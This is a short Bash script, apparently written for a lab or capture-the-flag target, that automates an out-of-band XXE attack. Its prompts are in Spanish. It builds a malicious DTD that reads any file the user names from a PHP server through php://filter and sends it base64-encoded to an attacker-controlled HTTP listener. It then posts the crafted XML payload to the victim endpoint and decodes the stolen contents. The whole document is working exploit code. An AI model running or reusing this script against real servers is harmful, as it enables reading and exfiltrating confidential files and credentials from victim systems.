# !/bin/bash

ip_atacante="192.168.1.12"
puerto_exfil=81

ctrl_c() {
    echo -e "\n\n[!] Saliendo..."
    kill -9 $PID 2>/dev/null
    rm response malicious.dtd 2>/dev/null
    exit 1
}
trap ctrl_c INT

fuser -k $puerto_exfil/tcp 2>/dev/null

printf "\n[+] Introduce el archivo a leer: "
read -r myFilename

cat > malicious.dtd <<EOF
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=$myFilename">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://$ip_atacante:$puerto_exfil/?file=%file;'>">
%eval;
%exfil;
EOF

printf "[+] Archivo malicious.dtd creado.\n"

python3 -m http.server $puerto_exfil > response 2>&1 &
PID=$!
sleep 2
printf "[+] Servidor HTTP (PID: $PID) listo en puerto $puerto_exfil.\n"

printf "[+] Enviando payload XML al servidor v√≠ctima...\n"
curl -s -X POST "http://localhost:5000/process.php" -d "<?xml version='1.0' encoding='UTF-8'?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://$ip_atacante:$puerto_exfil/malicious.dtd'> %xxe;]>
<root><name>fmoha</name><tel>123</tel><email>f@m.com</email><password>123</password></root>" &>/dev/null

sleep 2

grep -oP "file=\K[a-zA-Z0-9+/=]+" response | base64 -d

kill -9 $PID 2>/dev/null
rm response malicious.dtd 2>/dev/null
printf "[+] Limpieza completada.\n"

